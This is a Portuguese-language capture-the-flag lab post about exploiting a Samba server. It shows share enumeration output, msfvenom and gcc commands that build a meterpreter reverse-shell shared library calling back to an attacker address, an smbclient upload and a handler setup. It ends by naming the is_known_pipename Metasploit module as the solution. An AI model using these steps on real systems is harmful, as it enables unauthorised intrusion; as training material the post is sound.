172.16.1.107

Lab ID: 5134b5e4988244c50eaf67e293fbfc2769dfdb33

Utilize todas as técnicas aprendidas até o momento e analise o host:172.16.1.107, identifique a vulnerabilidade e obtenha acesso ao servidor.

Uma vez com acesso ao servidor, localize a key com a informação dentro do diretório do serviço explorado.

DICA: Prestar atenção no enunciado que diz: localize a key DENTRO DO DIRETORIO DO SERVIÇO EXPLORADO. Onde estão os arquivos de configuração do serviço explorado ?

[+] Attempting to map shares on 172.16.1.107                                                                                                                                                                      
                                                                                                                                                                                                                  
//172.16.1.107/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                 
//172.16.1.107/_        Mapping: OK Listing: OK Writing: N/A
//172.16.1.107/admin    Mapping: DENIED Listing: N/A Writing: N/A
//172.16.1.107/logon    Mapping: OK Listing: OK Writing: N/A

eu fiz um arquivo .so da seguinte forma:
- msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=172.20.1.43 lport=4443 -f c -o shell.c
- gcc -shared -o shell.so -fPIC shell.c
e depois joguei no dir:

smbclient //172.16.1.107/_ -N             
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Sep  2 09:50:34 2017
  ..                                  D        0  Mon Aug 28 13:33:03 2017
  vaii.so                             N      476  Thu May 25 22:01:14 2017
  shell.so                            N    15080  Sat Sep  2 09:50:35 2017
  xlZlIKdv.so                         N      476  Sat Jul 15 18:51:02 2017
  bBjVvYKc.so                         N      470  Thu May 25 20:02:39 2017
  FUjSUklp.so                         N      470  Thu May 25 20:00:48 2017
  ocSSCTvY.so                         N      476  Sat Jul 15 18:34:56 2017
  nxteYmOO.so                         N      470  Thu May 25 21:56:34 2017
  TPHocdsV.so                         N      476  Thu May 25 21:57:41 2017
  MNGOdmcZ.so                         N      476  Sun May 28 13:06:05 2017

                39428520 blocks of size 1024. 36328404 blocks available


use o exploit/multi/handler com Payload options (generic/shell_reverse_tcp)
mas não criou a sessão, no que estou errando?


RESOLUÇÃO

Usei o exploit/linux/samba/is_known_pipename para acessar o shell do servidor